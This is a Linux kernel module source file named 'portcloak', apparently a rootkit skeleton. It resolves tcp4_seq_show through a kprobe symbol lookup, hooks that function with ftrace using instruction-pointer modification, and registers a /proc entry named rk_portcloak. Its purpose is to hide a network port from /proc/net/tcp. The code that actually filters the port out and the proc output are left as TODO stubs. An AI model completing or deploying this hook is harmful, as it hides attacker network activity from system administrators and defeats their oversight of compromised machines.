// SPDX-License-Identifier: GPL-2.0
#include <linux/errno.h>
#include <linux/ftrace.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>

#define ENDBR_SIZE 4

static struct proc_dir_entry *proc_entry;
static unsigned long target_addr;

static unsigned long lookup_name(const char *name)
{
	struct kprobe kp = { .symbol_name = name };
	unsigned long addr;

	if (register_kprobe(&kp) < 0)
		return 0;
	addr = (unsigned long)kp.addr;
	unregister_kprobe(&kp);
	return addr;
}

static void notrace portcloak_hook(unsigned long ip, unsigned long parent_ip,
				   struct ftrace_ops *ops,
				   struct ftrace_regs *fregs)
{
	struct pt_regs *regs = ftrace_get_regs(fregs);

	if (!regs || within_module(parent_ip, THIS_MODULE))
		return;

	/* TODO: skip lines containing the hidden port */
}

static struct ftrace_ops portcloak_ops = {
	.func  = portcloak_hook,
	.flags = FTRACE_OPS_FL_SAVE_REGS
	       | FTRACE_OPS_FL_IPMODIFY
	       | FTRACE_OPS_FL_RECURSION,
};

static int install_hook(void)
{
	int err;

	target_addr = lookup_name("tcp4_seq_show");
	if (!target_addr)
		return -ENOENT;

	err = ftrace_set_filter_ip(&portcloak_ops, target_addr, 0, 0);
	if (err)
		return err;

	err = register_ftrace_function(&portcloak_ops);
	if (err) {
		ftrace_set_filter_ip(&portcloak_ops, target_addr, 1, 0);
		return err;
	}
	return 0;
}

static void remove_hook(void)
{
	unregister_ftrace_function(&portcloak_ops);
	ftrace_set_filter_ip(&portcloak_ops, target_addr, 1, 0);
}

static int portcloak_show(struct seq_file *m, void *v)
{
	/* TODO: use seq_printf(m, ...) or seq_puts(m, ...) */
	return 0;
}

static int __init portcloak_init(void)
{
	int err;

	err = install_hook();
	if (err)
		return err;

	proc_entry = proc_create_single("rk_portcloak", 0444, NULL, portcloak_show);
	if (!proc_entry) {
		remove_hook();
		return -ENOMEM;
	}

	return 0;
}

static void __exit portcloak_exit(void)
{
	proc_remove(proc_entry);
	remove_hook();
}

module_init(portcloak_init);
module_exit(portcloak_exit);

MODULE_LICENSE("GPL");
